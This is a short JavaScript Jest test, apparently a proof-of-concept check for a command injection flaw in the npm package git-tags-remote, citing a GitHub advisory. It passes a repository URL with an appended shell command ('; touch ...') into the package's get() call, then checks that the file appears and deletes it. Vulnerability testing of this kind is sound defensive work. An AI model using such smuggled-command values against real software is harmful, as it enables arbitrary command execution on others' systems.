//https://github.com/advisories/GHSA-gm9x-q798-hmr4
test("Command Injection in git-tags-remote", () => {
  const gitTagsRemote = require("git-tags-remote");
  const fs = require("fs");
  const path = "./git-tags-remote";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  gitTagsRemote
    .get(
      "https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test"
    )
    .then((tags) => {
      sleep.sleep(5);

      //checking that its created by after exploit.
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      fs.unlink(path, function (err) {}); //deleting the file after creation
    });

  // sleep.sleep(5);
  // //checking that its created by after exploit.
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(true);

  // fs.unlink(path, function(err) {});//deleting the file after creation
});
